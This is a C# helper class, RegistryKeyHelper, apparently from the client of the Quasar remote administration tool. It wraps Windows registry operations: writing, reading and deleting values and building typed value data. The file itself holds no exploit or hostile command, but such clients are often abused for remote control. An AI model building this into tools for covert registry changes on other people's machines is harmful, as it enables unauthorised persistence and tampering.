using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;
using Quasar.Client.Extensions;
using Quasar.Common.Models;
using Quasar.Common.Utilities;

namespace Quasar.Client.Helper
{
    public static class RegistryKeyHelper
    {
        private static string DEFAULT_VALUE = String.Empty;

        /// <summary>
        /// Adds a value to the registry key.
        /// </summary>
        /// <param name="hive">Represents the possible values for a top-level node on a foreign machine.</param>
        /// <param name="path">The path to the registry key.</param>
        /// <param name="name">The name of the value.</param>
        /// <param name="value">The value.</param>
        /// <param name="addQuotes">If set to True, adds quotes to the value.</param>
        /// <returns>True on success, else False.</returns>
        public static bool AddRegistryKeyValue(RegistryHive hive, string path, string name, string value, bool addQuotes = false)
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path))
                {
                    if (key == null) return false;

                    if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
                        value = "\"" + value + "\"";

                    key.SetValue(name, value);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// Opens a read-only registry key.
        /// </summary>
        /// <param name="hive">Represents the possible values for a top-level node on a foreign machine.</param>
        /// <param name="path">The path to the registry key.</param>
        /// <returns></returns>
        public static RegistryKey OpenReadonlySubKey(RegistryHive hive, string path)
        {
            try
            {
                return RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenSubKey(path, false);
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Deletes the specified value from the registry key.
        /// </summary>
        /// <param name="hive">Represents the possible values for a top-level node on a foreign machine.</param>
        /// <param name="path">The path to the registry key.</param>
        /// <param name="name">The name of the value to delete.</param>
        /// <returns>True on success, else False.</returns>
        public static bool DeleteRegistryKeyValue(RegistryHive hive, string path, string name)
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path))
                {
                    if (key == null) return false;
                    key.DeleteValue(name, true);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// Checks if the provided value is the default value
        /// </summary>
        /// <param name="valueName">The name of the value</param>
        /// <returns>True if default value, else False</returns>
        public static bool IsDefaultValue(string valueName)
        {
            return String.IsNullOrEmpty(valueName);
        }

        /// <summary>
        /// Adds the default value to the list of values and returns them as an array. 
        /// If default value already exists this function will only return the list as an array.
        /// </summary>
        /// <param name="values">The list with the values for which the default value should be added to</param>
        /// <returns>Array with all of the values including the default value</returns>
        public static RegValueData[] AddDefaultValue(List<RegValueData> values)
        {
            if(!values.Any(value => IsDefaultValue(value.Name)))
            {
                values.Add(GetDefaultValue());
            }
            return values.ToArray();
        }

        /// <summary>
        /// Gets the default registry values
        /// </summary>
        /// <returns>A array with the default registry values</returns>
        public static RegValueData[] GetDefaultValues()
        {
            return new[] {GetDefaultValue()};
        }

        public static RegValueData CreateRegValueData(string name, RegistryValueKind kind, object value = null)
        {
            var newRegValue = new RegValueData {Name = name, Kind = kind};

            if (value == null)
                newRegValue.Data = new byte[] { };
            else
            {
                switch (newRegValue.Kind)
                {
                    case RegistryValueKind.Binary:
                        newRegValue.Data = (byte[]) value;
                        break;
                    case RegistryValueKind.MultiString:
                        newRegValue.Data = ByteConverter.GetBytes((string[]) value);
                        break;
                    case RegistryValueKind.DWord:
                        newRegValue.Data = ByteConverter.GetBytes((uint) (int) value);
                        break;
                    case RegistryValueKind.QWord:
                        newRegValue.Data = ByteConverter.GetBytes((ulong) (long) value);
                        break;
                    case RegistryValueKind.String:
                    case RegistryValueKind.ExpandString:
                        newRegValue.Data = ByteConverter.GetBytes((string) value);
                        break;
                }
            }

            return newRegValue;
        }

        private static RegValueData GetDefaultValue()
        {
            return CreateRegValueData(DEFAULT_VALUE, RegistryValueKind.String);
        }
    }
}
